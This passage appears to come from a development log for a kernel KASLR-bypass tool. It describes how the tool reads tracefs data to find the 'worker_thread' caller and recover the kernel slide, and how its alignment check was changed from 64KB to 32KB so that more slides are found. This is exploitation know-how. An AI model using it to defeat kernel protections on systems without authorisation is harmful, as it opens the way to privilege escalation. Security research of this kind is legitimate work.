"worker_thread caller not found in trace" on some boots even with 150+
pages of real captured trace data (verified by porting `parse_trace_page()`
faithfully to a standalone Python script and running it against a
manually-captured raw dump -- the parser itself was correct; zero
candidates in the required 64KB-aligned range existed in the data
because that boot's real slide, `0x28000`, was never going to produce
one). **Fixed**: `src/kaslr.c`'s check now requires `(candidate &
0x7fffULL) == 0` (32KB alignment) instead. Confirmed on the very next
boot after the fix: `slide=0x58000` (odd 32KB multiple, previously
un-matchable) found via tracefs on the FIRST 1-second sample, first
attempt.
